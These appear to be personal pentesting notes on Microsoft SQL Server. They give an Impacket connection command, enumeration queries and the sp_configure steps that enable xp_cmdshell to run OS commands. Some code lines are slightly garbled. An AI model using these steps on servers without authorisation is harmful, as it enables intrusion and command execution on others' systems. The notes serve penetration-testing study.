
## Good places
[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## Warning
Be careful, you can **block accounts** if you fail login several times using an existing username.

## Impacket smb related scripts
If you have credentials:
```bash
# connect to a Microsoft SQL server
mssqlclient.py -port $PORT $domain/$sql_svc 
```

```mssql
SELECT @@version					 	# version check
SELECT DB_NAME()						# current database
SELECT name FROM master..sysdatabases;	# list databases


SELECT is_srvrolemember('sysadmin'); 	# role check

```

## Command Execution
Check if cmdshell is already active
```mssql   
EXEC xp_cmdshell ‘net user’; - privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
```
Configure to enable
```mssql
EXEC sp_configure ‘show advanced options’, 1; — priv  
RECONFIGURE; — priv  
EXEC sp_configure ‘xp_cmdshell’, 1; — priv  
RECONFIGURE; — priv
```